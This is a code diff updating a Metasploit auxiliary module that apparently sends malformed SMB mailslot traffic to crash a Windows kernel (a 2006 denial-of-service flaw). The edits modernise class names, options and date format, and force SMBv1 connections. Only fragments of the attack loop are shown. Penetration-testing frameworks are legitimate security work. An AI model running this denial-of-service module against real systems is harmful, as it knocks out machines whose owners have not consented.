@@ -1,14 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
-
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::SMB::Client
   include Msf::Auxiliary::Dos
 
@@ -36,17 +31,18 @@ class Metasploit3 < Msf::Auxiliary
         ],
       'Actions'     =>
         [
-          ['Attack'],
+          ['Attack', 'Description' => 'Run Denial of Service'],
         ],
       'DefaultAction' => 'Attack',
-      'DisclosureDate' => 'Jul 11 2006'
+      'DisclosureDate' => '2006-07-11'
     ))
 
     register_options(
       [
         OptString.new('MAILSLOT', [ true,  "The mailslot name to use", 'Alerter']),
-      ], self.class)
+      ])
 
+    deregister_options('SMB::ProtocolVersion')
   end
 
   # MAILSLOT: HydraLsServer
@@ -60,7 +56,7 @@ class Metasploit3 < Msf::Auxiliary
 
       print_status("Mangling the kernel, two bytes at a time...");
 
-      connect
+      connect(versions: [1])
       smb_login
 
       1.upto(1024) do |i|
@@ -95,5 +91,4 @@ class Metasploit3 < Msf::Auxiliary
 
     disconnect
   end
-
 end
